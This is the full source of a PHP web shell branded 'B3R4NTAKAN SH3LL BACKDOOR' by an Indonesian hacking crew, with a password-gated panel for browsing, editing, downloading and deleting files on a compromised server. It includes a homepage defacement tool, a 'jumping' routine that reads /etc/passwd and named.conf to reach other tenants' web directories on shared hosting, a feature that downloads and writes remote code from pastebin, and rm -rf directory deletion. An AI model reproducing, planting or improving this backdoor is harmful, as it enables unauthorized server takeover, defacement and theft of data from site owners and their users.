<?php
/*

Berantakan?Jelas wong kita orang ngebuatnya iseng2
[ Special Thanks For Friends Cyber Army ]

*/
session_start();
error_reporting(0);
set_time_limit(0);

$auth_pass = "07e99d5a7d32e5d5b305ea7c0fc7859e";
// Password Default [ Xploiter ]

function masuk() {
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="widht=device-widht, initial-scale=1">
    <meta name="author" content="CodeXploit">
    <meta name="description" content="B3R4NTAKAN SH3LL BACKDOOR">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
    <link href="http://fonts.googleapis.com/css?family=Gloria Hallelujah|Mali|New Rocker" rel="stylesheet" type="text/css">
    <title>B3R4NTAKAN SH3LL</title>
    <style>
    	h5{font-family:"Mali";font-size:30px;}
    	small{font-family:"Mali";font-size:8px;}
    	img{margin:0;padding:0;width:195px;}
    </style>
  </head>
  <body class="bg-dark text-white">
  	
  <center>
  	<h5 class="mt-4">[ B3R4NTAKAN SH3LL ]</h5><hr>
    <div class="container mt-4">
    	<img src="http://pngimages.net/sites/default/files/blue-open-lock-png-image-34849.png" alt=""><hr>
    	<form method="post">
    	<input type="password" name="pass" class="form-control mb-3 text-primary" placeholder="Enter Key"><input type="submit" name="ok" class="btn btn-warning btn-block" value="Masuk"></form>
    	<small class="muted">
    		Copyright &copy; all right reserved Official 22XploiterCrew
    	</small>
    </div>
   </center>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['ok']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
 else
masuk();
      
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['opt'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<?php
function hak($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Charopter special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="Lihatport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Official 22XploiterCrew">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
    <link href="http://fonts.googleapis.com/css?family=Gloria Hallelujah|Mali|New Rocker" rel="stylesheet" type="text/css">
    <title>B3R4NTAKAN SH3LL B4CKDOOR</title>
    <link href="http://fonts.googleapis.com/css?family=Gloria Hallelujah|Mali|New Rocker|Shadows Into Light" rel="stylesheet" type="text/css">
    <style>
    	.ikon{width:25px;margin:0;padding:0;}
    	body{font-family:"Mali";}
    	th{font-family:"Gloria Hallelujah";}
    	h3{font-family:"Shadows Into Light";font-size:3em;}
    </style>
  </head>
  <body>
  	
    <div class="alert alert-dark text-center">
    	<a href="#">
    		<h3>< B3R4NTAKAN SH3LL B4CKDOOR /></h3>
    	</a>
    	<hr>
    	<a href="?dir=<?= getcwd(); ?>">[ Home ]</a>
    	<a href="?info">[ Info Server ]</a>
    	<a href="?tebas=tebas">[ Tebas Index ]</a>
    	<a href="?upload" onclick="return confirm('Uploadernya error bngsd:(, Bikin file ae yo mas/mbk. Sorry:(')">[ Upload ]</a>
    	<a href="?jumping">[ Jumping ]</a>
    	<a href="?adminer" target="_blank">[ Adminer ]</a>
    	<a href="?logout">[ Logout ]</a>
    </div><div class="alert alert-primary mb-3 ml-2 mr-2">
<?php
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "</div>";
if(isset($_GET["logout"])) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}elseif($_GET["tebas"] == "tebas"){
	$isi = $_POST["isi"];
	$ren = $_POST["name"];
	$mek = rename($ren,"BackUp Index.txt");
	if(!$mek){
	echo '<div class="alert alert-danger">File <b>Index.php/Index.html Tidak Ditemukan</b></div>';
	exit;
}else{
	if(isset($_POST["tebas"])){
	$index = fopen($ren,"w");
					 fwrite($index,$isi);
					 fclose($index);
	if($index){
		echo "
		<script>
			document.location.href = '?dir=$dir';
		</script>
		";
		}
	}
}
echo '
<div class="container">
<form method="post">
	<select name="name" class="form-control mb-3" autofocus>
		<option value="index.php">Index.php</option>
		<option value="index.html">Index.html</option>
		</select>
	<textarea name="isi" class="form-control mb-3" rows="12"></textarea>
	<input type="submit" name="tebas" class="btn btn-primary btn-block" value="Tebas">
	</form>
	</div>
';
}elseif(isset($_GET["info"])){
	echo '
	<div class="alert alert-dark">
	<p>Nama Server : '.$_SERVER["SERVER_NAME"].'</p>
	<p>Ip Address : '.$_SERVER["SERVER_ADDR"].'</p>
	<p>Port : '.$_SERVER["SERVER_PORT"].'</p>
	<p>Koneksi : '.$_SERVER["HTTP_CONNECTION"].'</p>
	<p>Save Data : '.$_SERVER["HTTP_SAVE_DATA"].'</p>
	<p>Protokol : '.$_SERVER["SERVER_PROTOCOL"].'</p>
	<p>Software : '.$_SERVER["SERVER_SOFTWARE"].'</p>
	<p>Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].'</p>
	<p>Path : '.$_SERVER["PATH"].'</p>
	<p>Class Path : '.$_SERVER["SYSTEMSERVERCLASSPATH"].'</p>
	<p>Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</p>
	';
}elseif(isset($_GET["jumping"])){
	$i = 0;
	echo "<div class='alert alert-success'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($ambiil = fgets($f)) {
					$pecah = explode(":", $ambiil);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jump = "<p>[ - ]</p><a href='?dir=$url_user'><p>$url_user</p></a>";
							if(is_writable($url_user)) {
								$jump = "<p>[ + ]</p><a href='?dir=$url_user'><p>$url_user</p></a>";
							}
							echo $jump."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Mendapatkan ".$i." Di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" class="form-control m-3" rows="8">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($ambil = fgets($fp)) {
				echo $ambil;
			}
			echo  '</textarea><br>
				  <button type="submit" name="jump" class="btn btn-primary">Jumping Gayn</button>
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $puln);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$hore = "/var/www/".$puln[1]."/$url/httpdocs";
				if(is_dir($hore) === true) {
					if(is_readable($hore)) {
						$i++;
						$jump = "<p>[ + ]</p><a href='?dir=$hore'><p>$hore</p></a>";
						if(is_writable($hore)) {
							$jump = "<p>[ + ]</p><a href='?dir=$hore'><p>$hore</p></a>>";
						}
						echo $jump."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Mendapatkan ".$i." Di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" class="form-control m-3" rows="8">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <button type="submit" name="jump" class="btn btn-primary">Jumping Gayn</button>
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Gabisa Membaca /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Gabisa Membaca /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$horee = "/home/$user_idx_jump/public_html";
					if(is_readable($horee)) {
						$i++;
						$jump = "<p>[ + ]</p><a href='?dir=$horee'><p>$horee</p></a>";
						if(is_writable($horee)) {
							$jump = "<p>[ - ]</p><a href='?dir=$horee'><p>$horee</p></a>";
						}
						echo $jump;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Mendapatkan ".$i." Di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div></div>";
}elseif(isset($_GET["adminer"])){
	$url = "https://pastebin.com/raw/YVkwincY";
	$isi = file_get_contents($url);
	$buat = fopen("Adminer22Xploit.php","w");
					fwrite($buat,$isi);
					fclose($buat);
	if(isset($buat) == 1){
		echo "<div class='container'>
			<div class='alert alert-success text-center'>
				<a href='Adminer22Xploit.php'>Login Adminer</a>
			</div>
		</div>";
	}
}elseif($_GET['opt'] == 'filebaru') {
	if($_POST['new_save_file']) {
		$filebaru = htmlspecialchars($_POST['filebaru']);
		$isifile = $_POST['isi'];
		$fopen = fopen($filebaru, "a+");
						 fwrite($fopen,$isifile);
		if($fopen) {
			$opt = "<script>window.location='?opt=edit&dir=".$dir."&file=".$_POST['filebaru']."';</script>";
		} else {
			$opt = "<font color=red>Gagal Membuat File</font>";
		}
	}
	echo $opt;
	echo "<div class='container'>
		<form method='post'>
	<select class='form-control mb-3' readonly>
		<option readonly>Tempat : ".$dir."</option>
	</select>
	<input type='text' name='filebaru' placeholder='Nama File' class='form-control mb-3'>
	<textarea name='isi' class='form-control mb-3' placeholder='Isi File' rows='12'></textarea>
	<input type='submit' name='new_save_file' class='btn btn-primary' value='Bikin!'>
	</form></div>";
} elseif($_GET['opt'] == 'folderbaru') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['folderbaru']);
		if(!mkdir($new_folder)) {
			$opt = "<font color=red>Gagal Membuat Folder</font>";
		} else {
			$opt = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $opt;
	echo "<div class='container'>
		<form method='post'>
	<input type='text' name='folderbaru' class='form-control mb-3' placeholder='Nama Folder'>
	<input type='submit' name='new_save_folder' value='Submit' class='btn btn-primary'>
	</form></div>";
} elseif($_GET['opt'] == 'ubahD') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$opt = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$opt = "<font color=red>Gagal Mengubah Nama Folder</font>";
		}
	echo "".$opt."<br>";
	}
	echo "<div class='container'>
		<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' class='form-control mb-3'>
	<input type='submit' name='dir_rename' value='Ubah Nama' class='btn btn-primary'>
	</form></div>";
} elseif($_GET['opt'] == 'hapusD') {
	if(is_dir($dir)) {
		if(is_writable($dir)) {
			@rmdir($dir);
			@exe("rm -rf $dir");
			@exe("rmdir /s /q $dir");
			$opt = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$opt = "<font color=red>Gagal Menghapus".basename($dir)."</font>";
		}
	}
	echo $opt;
}elseif($_GET['opt'] == 'view') {
	echo "<div class='container'>";
	echo "Nama : <font color=black>".basename($_GET['file'])."</font><br> 
	[ <a href='?opt=view&dir=$dir&file=".$_GET['file']."'><b>Lihat</b></a> ]
	[ <a href='?opt=edit&dir=$dir&file=".$_GET['file']."'>Edit</a> ]
	[ <a href='?opt=rename&dir=$dir&file=".$_GET['file']."'>Ubah Nama</a> ]
	[ <a href='?opt=download&dir=$dir&file=".$_GET['file']."'>Download</a> ]
	[ <a href='?opt=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br>";
	echo "<hr><textarea readonly class='form-control' rows='12'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea></div>";
	
} elseif($_GET['opt'] == 'edit') {
	echo "<div class='container'>";
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$opt = "<font color=lime>Tersimpan</font>";
		} else {
			$opt = "<font color=red>Gagal Mengedit File</font>";
		}
	echo "".$opt."<br>";
	}
	echo "Nama : <font color=black>".basename($_GET['file'])."</font><br> 
	[ <a href='?opt=view&dir=$dir&file=".$_GET['file']."'>Lihat</a> ]
	[ <a href='?opt=edit&dir=$dir&file=".$_GET['file']."'><b>Edit</b></a> ]
	[ <a href='?opt=rename&dir=$dir&file=".$_GET['file']."'>Ubah Nama</a> ]
	[ <a href='?opt=download&dir=$dir&file=".$_GET['file']."'>Unduh</a> ]
	[ <a href='?opt=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br>";
	echo "<hr><form method='post'>
	<textarea name='src' class='form-control mb-3' rows='12'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Simpan Perubahan' name='save' class='btn btn-primary'>
	</form></div>";
	
} elseif($_GET['opt'] == 'rename') {
	echo "<div class='container'>";
	if($_POST['ubahF']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$opt = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$opt = "<font color=red>Gagal Ubah Nama File</font>";
		}
	echo "".$opt."<br>";
	}
	echo "Nama : <font color=black>".basename($_GET['file'])."</font><br> 
	[ <a href='?opt=view&dir=$dir&file=".$_GET['file']."'>Lihat</a> ]
	[ <a href='?opt=edit&dir=$dir&file=".$_GET['file']."'>Edit</a> ]
	[ <a href='?opt=rename&dir=$dir&file=".$_GET['file']."'><b>Ubah Nama</b></a> ]
	[ <a href='?opt=download&dir=$dir&file=".$_GET['file']."'>Unduh</a> ]
	[ <a href='?opt=delete&dir=$dir&file=".$_GET['file']."'>Hapus</a> ]<br>";
	echo "<hr><form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' class='form-control mb-3'>
	<input type='submit' name='ubahF' value='Ubah Nama' class='btn btn-primary'>
	</form></div>";
	
} elseif($_GET['opt'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$opt = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$opt = "<font color=red>Gagal Menghapus File</font>";
	}
	echo $opt;
}else{
	if(is_dir($dir) === true) {
	echo '<div class="table-responsive-lg">';
		echo '<table class="table table-bordered table-hover">
			<thead class="bg-warning">
				<tr>
					<th class="text-center" scope="col">Icon</th>
					<th class="text-center" scope="col">Nama</th>
					<th class="text-center" scope="col">Jenis</th>
					<th class="text-center" scope="col">Ukuran</th>
					<th class="text-center" scope="col">Permission</th>
					<th class="text-center" scope="col">Aksi</th>
				</tr>
			</thead>';
			$scan = scandir($dir);
			foreach($scan as $s){
				$dtype = filetype("$dir/$s");
			if(function_exists('posix_getgrgid')) {
					$group = @posix_getgrgid(filegroup("$dir/$s"));
					$group = $group['name'];
				} else {
					$group = filegroup("$dir/$s");
				}
 				if(!is_dir("$dir/$s")) continue;
 				if($s === '..') {
 					$nama = "<a href='?dir=".dirname($dir)."'>$s</a>";
 				} elseif($s === '.') {
 					$nama = "<a href='?dir=$dir'>$s</a>";
 				} else {
 					$nama = "<a href='?dir=$dir/$s'>$s</a>";
 				}
 				if($s === '.' || $s === '..') {
 					$aksi_fol = "
 					<a href='?opt=filebaru&dir=$dir'>[Buat File]</a>
 					<a href='?opt=folderbaru&dir=$dir'>[Buat Folder]</a>
 					";
 					} else {
 					$aksi_fol = "
 					<a href='?opt=ubahD&dir=$dir/$s'>[Ubah Nama]</a>
 					<a href='?opt=hapusD&dir=$dir/$s'>[Hapus]</a>
 					";
 			}
		echo "<tr>";
 				echo "<td scope='row'>
 					<img src='https://cdn6.aptoide.com/imgs/5/3/d/53dd567dd64a2220fa76e0e622e67b13_icon.png?w=240' class='ikon'></td>";
 				echo "<td>".$nama."</td>";
				echo "<td><center>$dtype</center></td>";
				echo "<td><center>".filesize($s).".kb</center></td>";
				echo "<td><center>".hak("$dir/$s",perms("$dir/$s"))."</center></td>";
				echo "<td style='padding-left: 15px;'>$aksi_fol</td>";
				echo "</tr>";
			}
	} else {
		echo "<font color=red>Tidak Bisa Membaca Direktori Ini.</font>";
	}
	foreach($scan as $file) {
			$ftype = filetype("$dir/$file");
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td scope='row'>
				<img src='http://icons.iconarchive.com/icons/zhoolego/material/256/Filetype-Docs-icon.png' class='ikon'></td>";
			echo "<td><a href='?opt=view&dir=$dir&file=$dir/$file'>".$file."</a></td>";
			echo "<td><center>$ftype</center></td>";
			echo "<td><center>$size</center></td>";
			echo "<td><center>".hak("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td>
				<a href='?opt=edit&dir=$dir&file=$dir/$file'>[Edit]</a>
			<a href='?opt=rename&dir=$dir&file=$dir/$file'>[Ubah Nama]</a>
			<a href='?opt=delete&dir=$dir&file=$dir/$file'>[Hapus]</a>
			<a href='?opt=download&dir=$dir&file=$dir/$file'>[Unduh]</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<center><small class='muted'>
	Copyright &copy; <?= date('Y'); ?> all right reserved 22XploiterCrew</small></center>";
		}
}
?>
  </body>
</html>